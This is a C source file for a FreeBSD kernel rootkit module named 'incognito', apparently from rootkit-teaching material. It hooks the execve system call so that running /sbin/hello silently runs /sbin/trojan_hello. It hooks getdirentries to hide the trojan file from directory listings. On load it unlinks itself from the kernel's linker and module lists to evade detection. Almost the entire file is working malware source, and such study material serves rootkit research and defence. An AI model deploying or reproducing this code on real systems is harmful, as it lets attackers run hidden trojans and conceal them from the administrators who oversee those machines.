/*-
 * Copyright (c) 2007 Joseph Kong.
 * All rights reserved.
 *
 * Redistribution and use in source and binary forms, with or without
 * modification, are permitted provided that the following conditions
 * are met:
 * 1. Redistributions of source code must retain the above copyright
 *    notice, this list of conditions and the following disclaimer.
 * 2. Redistributions in binary form must reproduce the above copyright
 *    notice, this list of conditions and the following disclaimer in the
 *    documentation and/or other materials provided with the distribution.
 * 3. Neither the name of the author nor the names of any co-contributors
 *    may be used to endorse or promote products derived from this software
 *    without specific prior written permission.
 *
 * THIS SOFTWARE IS PROVIDED BY THE AUTHOR AND CONTRIBUTORS ``AS IS'' AND
 * ANY EXPRESS OR IMPLIED WARRANTIES, INCLUDING, BUT NOT LIMITED TO, THE
 * IMPLIED WARRANTIES OF MERCHANTABILITY AND FITNESS FOR A PARTICULAR PURPOSE
 * ARE DISCLAIMED.  IN NO EVENT SHALL THE AUTHOR OR CONTRIBUTORS BE LIABLE
 * FOR ANY DIRECT, INDIRECT, INCIDENTAL, SPECIAL, EXEMPLARY, OR CONSEQUENTIAL
 * DAMAGES (INCLUDING, BUT NOT LIMITED TO, PROCUREMENT OF SUBSTITUTE GOODS
 * OR SERVICES; LOSS OF USE, DATA, OR PROFITS; OR BUSINESS INTERRUPTION)
 * HOWEVER CAUSED AND ON ANY THEORY OF LIABILITY, WHETHER IN CONTRACT, STRICT
 * LIABILITY, OR TORT (INCLUDING NEGLIGENCE OR OTHERWISE) ARISING IN ANY WAY
 * OUT OF THE USE OF THIS SOFTWARE, EVEN IF ADVISED OF THE POSSIBILITY OF
 * SUCH DAMAGE.
 *
 * Copyright (c) 2001, Stephanie Wehner <atrak@itsx.com>
 * All rights reserved.
 *
 * Redistribution and use in source and binary forms, with or without
 * modification, are permitted provided that the following conditions
 * are met:
 *
 * 1. Redistributions of source code must retain the above copyright
 *    notice, this list of conditions and the following disclaimer.
 * 2. Redistributions in binary form must reproduce the above copyright
 *    notice, this list of conditions and the following disclaimer in the
 *    documentation and/or other materials provided with the distribution.
 * 3. The names of its contributors may be used to endorse or promote products
 *    derived from this software without specific prior written permission.
 *
 * THIS SOFTWARE IS PROVIDED BY THE COPYRIGHT HOLDER AND CONTRIBUTORS "AS IS"
 * AND ANY EXPRESS OR IMPLIED WARRANTIES, INCLUDING, BUT NOT LIMITED TO, THE
 * IMPLIED WARRANTIES OF MERCHANTABILITY AND FITNESS FOR A PARTICULAR PURPOSE
 * ARE DISCLAIMED. IN NO EVENT SHALL THE REGENTS OR CONTRIBUTORS BE LIABLE
 * FOR ANY DIRECT, INDIRECT, INCIDENTAL, SPECIAL, EXEMPLARY, OR CONSEQUENTIAL
 * DAMAGES (INCLUDING, BUT NOT LIMITED TO, PROCUREMENT OF SUBSTITUTE GOODS
 * OR SERVICES; LOSS OF USE, DATA, OR PROFITS; OR BUSINESS INTERRUPTION)
 * HOWEVER CAUSED AND ON ANY THEORY OF LIABILITY, WHETHER IN CONTRACT, STRICT
 * LIABILITY, OR TORT (INCLUDING NEGLIGENCE OR OTHERWISE) ARISING IN ANY WAY
 * OUT OF THE USE OF THIS SOFTWARE, EVEN IF ADVISED OF THE POSSIBILITY OF
 * SUCH DAMAGE.
 */

#include <sys/types.h>
#include <sys/param.h>
#include <sys/proc.h>
#include <sys/module.h>
#include <sys/sysent.h>
#include <sys/kernel.h>
#include <sys/systm.h>
#include <sys/syscall.h>
#include <sys/sysproto.h>
#include <sys/malloc.h>

#include <sys/linker.h>
#include <sys/lock.h>
#include <sys/mutex.h>

#include <vm/vm.h>
#include <vm/vm_page.h>
#include <vm/vm_map.h>

#include <dirent.h>

#define ORIGINAL	"/sbin/hello"
#define TROJAN		"/sbin/trojan_hello"
#define T_NAME		"trojan_hello"
#define VERSION		"incognito-0.3.ko"

/*
 * The following is the list of variables you need to reference in order
 * to hide this module, which aren't defined in any header files.
 */
extern linker_file_list_t linker_files;
extern struct mtx kld_mtx;
extern int next_file_id;

typedef TAILQ_HEAD(, module) modulelist_t;
extern modulelist_t modules;
extern int nextid;
struct module {
	TAILQ_ENTRY(module)	link;    /* chain together all modules */
	TAILQ_ENTRY(module)	flink;   /* all modules in a file */
	struct linker_file	*file;   /* file which contains this module */
	int			refs;    /* reference count */
	int			id;      /* unique id number */
	char			*name;   /* module name */
	modeventhand_t		handler; /* event handler */
	void			*arg;    /* argument for handler */
	modspecific_t		data;    /* module specific data */
};

/*
 * execve system call hook.
 * Redirects the execution of ORIGINAL into TROJAN.
 */
static int
execve_hook(struct thread *td, void *syscall_args)
{
        struct execve_args /* {
                char *fname;
                char **argv;
                char **envv;
        } */ *uap;
        uap = (struct execve_args *)syscall_args;

        struct execve_args kernel_ea;
        struct execve_args *user_ea;
        struct vmspace *vm;
        vm_offset_t base, addr;
        char t_fname[] = TROJAN;

        /* Redirect this process? */
        if (strcmp(uap->fname, ORIGINAL) == 0) {
                /*
                 * Determine the end boundary address of the current
                 * process's user data space.
                 */
                vm = curthread->td_proc->p_vmspace;
                base = round_page((vm_offset_t) vm->vm_daddr);
                addr = base + ctob(vm->vm_dsize);

                /*
                 * Allocate a PAGE_SIZE null region of memory for a new set
                 * of execve arguments.
                 */
                vm_map_find(&vm->vm_map, NULL, 0, &addr, PAGE_SIZE, FALSE,
                    VM_PROT_ALL, VM_PROT_ALL, 0);
                vm->vm_dsize += btoc(PAGE_SIZE);

                /*
                 * Set up an execve_args structure for TROJAN. Remember, you
                 * have to place this structure into user space, and because
                 * you can't point to an element in kernel space once you are
                 * in user space, you'll have to place any new "arrays" that
                 * this structure points to in user space as well.
                 */
                copyout(&t_fname, (char *)addr, strlen(t_fname));
                kernel_ea.fname = (char *)addr;
                kernel_ea.argv = uap->argv;
                kernel_ea.envv = uap->envv;

                /* Copy out the TROJAN execve_args structure. */
                user_ea = (struct execve_args *)addr + sizeof(t_fname);
                copyout(&kernel_ea, user_ea, sizeof(struct execve_args));

                /* Execute TROJAN. */
                return(execve(curthread, user_ea));
        }

        return(execve(td, syscall_args));
}

/*
 * getdirentries system call hook.
 * Hides the file T_NAME.
 */
static int
getdirentries_hook(struct thread *td, void *syscall_args)
{
        struct getdirentries_args /* {
                int fd;
                char *buf;
                u_int count;
                long *basep;
        } */ *uap;
        uap = (struct getdirentries_args *)syscall_args;

        struct dirent *dp, *current;
        unsigned int size, count;

        /*
         * Store the directory entries found in fd in buf, and record the
         * number of bytes actually transferred.
         */
        getdirentries(td, syscall_args);
        size = td->td_retval[0];

        /* Does fd actually contain any directory entries? */
        if (size > 0) {
                MALLOC(dp, struct dirent *, size, M_TEMP, M_NOWAIT);
                copyin(uap->buf, dp, size);

                current = dp;
                count = size;

                /*
                 * Iterate through the directory entries found in fd.
                 * Note: The last directory entry always has a record length
                 * of zero.
                 */
                while ((current->d_reclen != 0) && (count > 0)) {
                        count -= current->d_reclen;

                        /* Do we want to hide this file? */
                        if(strcmp((char *)&(current->d_name), T_NAME) == 0)
                        {
                                /*
                                 * Copy every directory entry found after
                                 * T_NAME over T_NAME, effectively cutting it
                                 * out.
                                 */
                                if (count != 0)
                                        bcopy((char *)current +
                                            current->d_reclen, current,
                                            count);

                                size -= current->d_reclen;
                                break;
                        }

                        /*
                         * Are there still more directory entries to
                         * look through?
                         */
                        if (count != 0)
                                /* Advance to the next record. */
                                current = (struct dirent *)((char *)current +
                                    current->d_reclen);
                }

                /*
                 * If T_NAME was found in fd, adjust the "return values" to
                 * hide it. If T_NAME wasn't found...don't worry 'bout it.
                 */
                td->td_retval[0] = size;
                copyout(dp, uap->buf, size);

                FREE(dp, M_TEMP);
        }

        return(0);
}

/* The function called at load/unload. */
static int
load(struct module *module, int cmd, void *arg)
{
	struct linker_file *lf;
	struct module *mod;

	mtx_lock(&Giant);
	mtx_lock(&kld_mtx);

	/* Decrement the current kernel image's reference count. */
	(&linker_files)->tqh_first->refs--;

	/*
	 * Iterate through the linker_files list, looking for VERSION.
	 * If found, decrement next_file_id and remove from list.
	 */
	TAILQ_FOREACH(lf, &linker_files, link) {
		if (strcmp(lf->filename, VERSION) == 0) {
			next_file_id--;
			TAILQ_REMOVE(&linker_files, lf, link);
			break;
		}
	}

	mtx_unlock(&kld_mtx);
	mtx_unlock(&Giant);

	sx_xlock(&modules_sx);

	/*
	 * Iterate through the modules list, looking for "incognito."
	 * If found, decrement nextid and remove from list.
	 */
	TAILQ_FOREACH(mod, &modules, link) {
		if (strcmp(mod->name, "incognito") == 0) {
			nextid--;
			TAILQ_REMOVE(&modules, mod, link);
			break;
		}
	}

	sx_xunlock(&modules_sx);

	sysent[SYS_execve].sy_call = (sy_call_t *)execve_hook;
	sysent[SYS_getdirentries].sy_call = (sy_call_t *)getdirentries_hook;

	return(0);
}

static moduledata_t incognito_mod = {
	"incognito",		/* module name */
	load,			/* event handler */
	NULL			/* extra data */
};

DECLARE_MODULE(incognito, incognito_mod, SI_SUB_DRIVERS, SI_ORDER_MIDDLE);
